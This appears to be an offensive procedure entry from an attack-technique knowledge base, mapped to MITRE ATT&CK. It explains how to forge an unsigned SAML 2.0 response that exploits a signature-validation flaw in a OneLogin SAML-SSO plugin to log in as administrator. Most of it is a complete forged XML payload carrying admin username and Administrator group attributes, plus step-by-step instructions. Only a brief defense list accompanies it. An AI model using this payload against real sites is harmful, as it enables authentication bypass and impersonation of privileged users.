---
tags:
  - saml
  - forgery
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:52.143Z'
sub_techniques: []
id: 443487e1-dd8b-4637-82f7-cf74ade40698
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Craft-Unsigned-SAML-Response

## Summary

This procedure creates a forged SAML 2.0 response XML without a digital signature, specifying admin user details to exploit validation flaws in the OneLogin SAML-SSO plugin.

## Description

Attackers manually author an XML file mimicking a valid SAML assertion but omit the `<ds:Signature>` element, which the plugin's Response.php only checks if present. The response includes Success status, admin attributes (e.g., Username='admin', memberOf='Administrator'), and is structured per SAML 2.0 specs. This bypasses source validation, allowing unauthenticated login. Prerequisites include XML knowledge; outcomes enable impersonation on sites like WordPress.

## Requirements

1. Understanding of SAML 2.0 XML structure
2. Text editor for XML creation
3. Target user details (e.g., email, role)

## Defense

Defensive measures and detection strategies:

- Enforce signature validation in SAML configurations
- Log and alert on unsigned SAML responses
- Use mutual TLS for IdP communication

## Objectives

1. Generate valid-looking unsigned SAML XML
2. Embed admin privileges in attributes
3. Bypass plugin's isValid() check

## Instructions

### Step 1: Structure SAML Response

**Context**: Build the core SAML elements without signature.

Create response.xml with:

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_id" Version="2.0" IssueInstant="2024-10-01T00:00:00Z">
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_id2" IssueInstant="2024-10-01T00:00:00Z" Version="2.0">
    <saml:Issuer>fake-idp.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">noreply@target.com</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2024-10-01T00:00:00Z" NotOnOrAfter="2024-10-01T01:00:00Z"/>
    <saml:AuthnStatement AuthnInstant="2024-10-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="User.Username">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="User.email">
        <saml:AttributeValue>noreply@target.com</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="memberOf">
        <saml:AttributeValue>Administrator</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

> Ensure namespaces are correct and no <ds:Signature> is included. Expected output: Saved XML file.

### Step 2: Validate XML Structure

**Context**: Ensure the XML is well-formed.

Use xmllint or browser to parse:

```bash
xmllint --noout response.xml
```

> No errors indicate valid structure. Expected output: "response.xml validates".

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[saml]]
- [[forgery]]
